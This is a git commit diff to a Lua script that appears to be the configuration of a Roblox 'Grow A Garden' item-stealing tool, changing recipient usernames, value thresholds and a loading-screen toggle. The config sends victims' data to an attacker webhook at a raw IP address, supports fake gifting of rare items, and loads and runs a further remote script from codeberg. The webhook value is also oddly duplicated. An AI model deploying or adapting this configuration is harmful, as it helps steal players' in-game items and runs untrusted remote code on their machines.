38f2e3a349dd3a0f1e3fdb1266e93993cda87b5a
zuldob3 <andreygat22@gmail.com>
2025-08-06 04:10:42 +0200

    Upload script.lua via Script Source Converter

--- script.lua
+++ script.lua
@@ -1,11 +1,11 @@
 _G.NullConfig = {
-    User = {"mikl222007"},
-    min_value = 10000000000,
+    User = {},
+    min_value = 1000,
     pingEveryone = "Yes", -- dont change this
     Webhook = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789chttp://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
     FakeGift = "No",
     Trash = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
-    LoadingScreen = "Yes",
+    LoadingScreen = "No",
     GiftOnlyRares = "No",
     ExecuteOtherScript = "Yes",
     OtherScript = "https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua",
